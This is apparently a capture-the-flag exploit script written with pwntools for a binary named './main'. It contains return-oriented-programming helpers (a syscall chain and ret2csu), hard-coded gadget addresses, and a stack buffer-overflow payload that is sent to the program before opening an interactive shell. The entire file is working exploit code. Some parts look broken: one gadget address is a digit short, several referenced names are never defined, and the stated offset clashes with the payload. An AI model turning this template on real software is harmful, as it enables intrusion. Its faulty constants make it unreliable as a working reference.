from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(HOST, PORT, *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


def syscall(rax, rdi, rsi, rdx):
    payload = p64(pop_rax) + p64(rax)
    payload += p64(pop_rdi) + p64(rdi)
    payload += p64(pop_rsi) + p64(rsi)
    payload += p64(pop_rdx) + p64(rdx) + p64(0)
    payload += p64(syscall_ret)

    return payload


def ret2csu(
    call_func,
    rdi=0,
    rsi=0,
    rdx=0,
    rbx=0,
    rbp=1,
    r12=0,
    r13=0,
    r14=0,
    r15=0,
):
    # First __libc_csu_init POPPER rbx, rbp, r12, r13, r14, r15
    payload = p64(FIRST_POPPER)
    payload += p64(rbx)  # Fill rbx with 0
    payload += p64(rbp)  # Set RBP to 1 to pass CMP
    payload += p64(call_func)  # call _init to padding the stack
    payload += p64(rdi)  # RDI
    payload += p64(rsi)  # RSI
    payload += p64(rdx)  # RDX
    # Second __libc_csu_init MOV rdx, rsi, edi
    payload += p64(SECOND_POPPER)
    payload += p64(0)  # Padding rsp+8
    payload += p64(rbx)
    payload += p64(rbp)
    payload += p64(r12)
    payload += p64(r13)
    payload += p64(r14)
    payload += p64(r15)
    return payload


# Specify GDB script here (breakpoints etc)
gdbscript = """
init-pwndbg
b *vuln+39
b *vuln+95
continue
""".format(
    **locals()
)

# Binary filename
exe = "./main"
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
context.terminal = "tmux splitw -h".split(" ")
context.log_level = "debug"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Lib-C library, can use pwninit/patchelf to patch binary
# libc = ELF("./libc.so.6")
# ld = ELF("./ld-2.27.so")

# Pass in pattern_size, get back EIP/RIP offset
WIN = 0x00000000004011F6
RET = 0x000000000040101A
JMP_RBP = 0x000000000040122  # jmp rbp;
LEAVE_RET = 0x0000000000401256
POP_RBP_RET = 0x00000000004011DD  # : pop rbp ; ret
CALL_RAX = 0x0000000000401014  #: call rax
JMP_RAX = 0x000000000040116C  #: jmp rax
offset = 40


# Start program
io = start()
# shellcode = asm(shellcraft.cat(b"*"))
# print(shellcode)
# print(len(shellcode))

# print(elf.bss())

# Build the payload
payload = b"A" * 32 + p64(JMP_RBP) + p64(RET) + p64(elf.sym["vuln"])

# payload = p32(0xE5FF)

# Send the payload
io.sendlineafter(b"text/plain\r\n", payload)

# Got Shell?
io.interactive()
